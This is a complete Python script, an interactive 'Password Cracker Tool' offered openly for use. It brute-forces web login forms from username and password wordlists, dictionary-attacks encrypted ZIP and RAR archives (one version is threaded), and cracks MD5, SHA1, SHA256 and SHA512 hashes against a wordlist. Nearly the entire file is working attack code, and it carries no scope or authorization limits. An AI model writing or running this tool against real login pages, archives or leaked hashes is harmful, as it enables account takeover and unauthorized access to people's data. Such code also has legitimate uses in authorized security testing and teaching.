# Password Cracker Tool

# This script allows you to perform various types of password brute-forcing attacks.
# Web login brute-forcing
# Compressed Files (ZIP ,RAR ,GZIP file brute-forcing)
# Hash cracking for common hashes (MD5, SHA1, SHA256, SHA512)

import requests
from colorama import Fore, Style, init
import hashlib
import sys
import pyzipper
import rarfile
import gzip
from threading import Thread, Event

init(autoreset=True)


def web_bruteforce(username, url, password_file, login_failed_string, cookie_value):
    from colorama import Fore
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print(Fore.RED + f'Trying: {password} for {username}')
            data = {'username': username,
                    'password': password, 'Login': 'submit'}
            if cookie_value != '':
                response = requests.get(
                    url,
                    params={'username': username,
                            'password': password, 'Login': 'Login'},
                    cookies={'Cookie': cookie_value}
                )
            else:
                response = requests.post(url, data=data)
            if login_failed_string in response.content.decode():
                print(Fore.YELLOW +
                        f'Login failed for {username}:{password}')
            else:
                print(Fore.GREEN + f'[+] Found Username: ==> {username}')
                print(Fore.GREEN + f'[+] Found Password: ==> {password}')
                return  # Stop after finding a valid login
    print('[!!] Password Not In List')


def zip_bruteforce(zip_path, password_file):
    with pyzipper.AESZipFile(zip_path) as zf, open(password_file, 'r') as pf:
        for password in pf:
            password = password.strip()
            try:
                # Try extracting the first file only for reliability
                first_file = zf.namelist()[0]
                zf.extract(first_file, pwd=password.encode('utf-8'))
                print(Fore.GREEN + f'[+] ZIP Password Found: {password}')
                return
            except Exception as e:
                print(Fore.RED + f'Trying: {password} ({e})')
    print('[!!] Password Not In List')


def rar_bruteforce(rar_path, password_file):
    with rarfile.RarFile(rar_path) as rf, open(password_file, 'r') as pf:
        for password in pf:
            password = password.strip()
            try:
                rf.extractall(pwd=password)
                print(Fore.GREEN + f'[+] RAR Password Found: {password}')
                return
            except:
                print(Fore.RED + f'Trying: {password}')
    print('[!!] Password Not In List')


def gzip_bruteforce(gzip_path, password_file):
    # GZIP files are not password protected by default, so this is a placeholder
    print(Fore.YELLOW + '[!!] GZIP password protection is not supported by the gzip module.')


def hash_crack(hash_value, hash_type, password_file):
    hash_type = hash_type.lower()
    with open(password_file, 'r') as pf:
        for password in pf:
            password = password.strip()
            if hash_type == 'md5':
                hashed = hashlib.md5(password.encode()).hexdigest()
            elif hash_type == 'sha1':
                hashed = hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == 'sha256':
                hashed = hashlib.sha256(password.encode()).hexdigest()
            elif hash_type == 'sha512':
                hashed = hashlib.sha512(password.encode()).hexdigest()
            else:
                print(Fore.YELLOW + '[!!] Unsupported hash type.')
                return
            print(Fore.RED + f'Trying: {password}')
            if hashed == hash_value:
                print(Fore.GREEN + f'[+] Hash cracked! Password is: {password}')
                return
    print('[!!] Password Not In List')


def zip_bruteforce_threaded(zip_path, password_file):
    found = Event()
    try:
        def extract_zip(zfile, password):
            if found.is_set():
                return
            try:
                first_file = zfile.namelist()[0]
                zfile.extract(first_file, pwd=password.encode('utf-8'))
                print(Fore.GREEN + f'[+] ZIP Password Found: {password}')
                found.set()
            except Exception as e:
                print(Fore.RED + f'Trying: {password} ({e})')
                pass
        with pyzipper.AESZipFile(zip_path) as zf, open(password_file, 'r') as pf:
            threads = []
            for line in pf:
                password = line.strip()
                t = Thread(target=extract_zip, args=(zf, password))
                t.start()
                threads.append(t)
                if found.is_set():
                    break
            for t in threads:
                t.join()
        if not found.is_set():
            print('[!!] Password Not In List')
    except KeyboardInterrupt:
        print("\n[!] Keyboard Interrupt detected. Returning to main menu.")



def main():
    while True:
        print(Fore.MAGENTA + Style.BRIGHT + 'Welcome to the Password Cracker Tool')
        print(Fore.BLUE + Style.BRIGHT + 'Select an option to proceed:')
        print(Fore.CYAN + Style.BRIGHT + 'Password Cracker Tool')
        print(Fore.YELLOW + 'Choose an option:')
        print(Fore.GREEN + '[1] Web Login Bruteforce')
        print(Fore.GREEN + '[2] ZIP File Bruteforce')
        print(Fore.GREEN + '[3] RAR File Bruteforce')
        print(Fore.GREEN + '[4] GZIP File Bruteforce')
        print(Fore.GREEN + '[5] Hash Crack')
        print(Fore.GREEN + '[6] ZIP File Bruteforce (Threaded)')
        print(Fore.RED + '[0] Exit')
        choice = input('[*] Select attack type: ')
        
        if choice == '0':
            sys.exit()
        elif choice == '1':
            url = input('[+] Enter Page URL: ')
            username_file = input('[+] Enter Username File To Use: ')
            password_file = input('[+] Enter Password File To Use: ')
            login_failed_string = input(
                '[+] Enter String That Occurs When Login Fails: ')
            cookie_value = input('Enter Cookie Value(Optional): ')
            try:
                with open(username_file, 'r') as users:
                    for username in users:
                        username = username.strip()
                        web_bruteforce(username, url, password_file,
                                    login_failed_string, cookie_value)
            except KeyboardInterrupt:
                print("\n[!] Keyboard Interrupt detected. Returning to main menu.")

        elif choice == '2':
            zip_path = input('[+] Enter ZIP file path: ')
            password_file = input('[+] Enter Password File To Use: ')
            zip_bruteforce(zip_path, password_file)
        elif choice == '3':
            rar_path = input('[+] Enter RAR file path: ')
            password_file = input('[+] Enter Password File To Use: ')
            rar_bruteforce(rar_path, password_file)
        elif choice == '4':
            gzip_path = input('[+] Enter GZIP file path: ')
            password_file = input('[+] Enter Password File To Use: ')
            gzip_bruteforce(gzip_path, password_file)
        elif choice == '5':
            hash_value = input('[+] Enter hash value: ')
            hash_type = input('[+] Enter hash type (md5, sha1, sha256, sha512): ')
            password_file = input('[+] Enter Password File To Use: ')
            hash_crack(hash_value, hash_type, password_file)
        elif choice == '6':
            zip_path = input('[+] Enter ZIP file path: ')
            password_file = input('[+] Enter Password File To Use: ')
            zip_bruteforce_threaded(zip_path, password_file)
        else:
            print(Fore.RED + '[!!] Invalid option, please try again.')
            
    
        cont = input(Fore.YELLOW + 'Do you want to continue? (y/n): ')
        if cont.lower() != 'y':
            print(Fore.YELLOW + 'Exiting the tool. Goodbye!')
            sys.exit()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Keyboard Interrupt detected. Returning to main menu.")
